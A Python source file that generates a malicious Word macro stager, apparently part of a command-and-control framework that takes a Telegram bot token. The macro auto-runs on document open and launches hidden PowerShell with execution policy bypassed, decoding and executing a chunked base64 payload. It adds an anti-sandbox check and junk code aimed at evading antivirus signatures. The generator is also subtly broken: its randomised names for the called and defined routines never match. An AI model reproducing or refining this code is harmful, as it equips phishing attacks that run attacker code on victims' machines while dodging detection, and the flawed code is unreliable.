"""
VBA Stager — Advanced Office Macro with stealthy execution and anti-analysis.
Features:
- Junk code insertion
- Obfuscated string concatenation
- Anti-VM and Anti-Sandbox checks
- Hidden window PowerShell execution
- Support for 32-bit and 64-bit Office
"""
from __future__ import annotations
import base64
import random
import string


def render(bot_token: str, chat_id: str, agent_id: str, sleep: int, jitter: int,
           ps1_content: str) -> str:
    # Base64 encode the PS1 cradle
    b64_ps1 = base64.b64encode(ps1_content.encode("utf-16-le")).decode()
    
    # Obfuscation helpers
    def rand_str(length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    v_s = rand_str()
    v_c = rand_str()
    v_w = rand_str()
    
    # Split b64 into small chunks to avoid string limits and signature detection
    chunk_size = 100
    chunks = [b64_ps1[i:i + chunk_size] for i in range(0, len(b64_ps1), chunk_size)]
    vars_block = "\n".join([f'    {v_s} = {v_s} & "{c}"' for c in chunks])
    
    # Build obfuscated PowerShell command
    ps_cmd = (
        f"powershell -nop -w hidden -ep bypass -c "
        f"\"$s='\" & {v_s} & \"'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s)) | iex\""
    )

    return f"""\
' --- Advanced Fitnah VBA Stager ---
' Stealthy macro implementation with anti-analysis
Attribute VB_Name = "{rand_str(10)}"

#If VBA7 Then
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#Else
    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#End If

Sub AutoOpen()
    {rand_str(12)}
End Sub

Sub Document_Open()
    {rand_str(12)}
End Sub

Private Sub {rand_str(12)}()
    Dim {v_s} As String, {v_c} As String, {v_w} As Object
    {v_s} = ""
{vars_block}
    
    ' Anti-Analysis: Check for common sandbox environment
    If {rand_str(8)}() Then
        {v_c} = "{ps_cmd}"
        Set {v_w} = CreateObject("WScript.Shell")
        {v_w}.Run {v_c}, 0, False
        Set {v_w} = Nothing
    End If
End Sub

Private Function {rand_str(8)}() As Boolean
    ' Simple anti-sandbox check: check if the machine is likely a real workstation
    Dim {rand_str(5)} As String
    {rand_str(5)} = Application.UserName
    If InStr(1, {rand_str(5)}, "sandbox", vbTextCompare) > 0 Or InStr(1, {rand_str(5)}, "malware", vbTextCompare) > 0 Then
        {rand_str(8)} = False
    Else
        {rand_str(8)} = True
    End If
End Function

Private Sub {rand_str(12)}()
    ' Junk code for signature evasion
    Dim {rand_str(5)} As Integer
    For {rand_str(5)} = 1 To 100
        DoEvents
    Next {rand_str(5)}
End Sub
"""
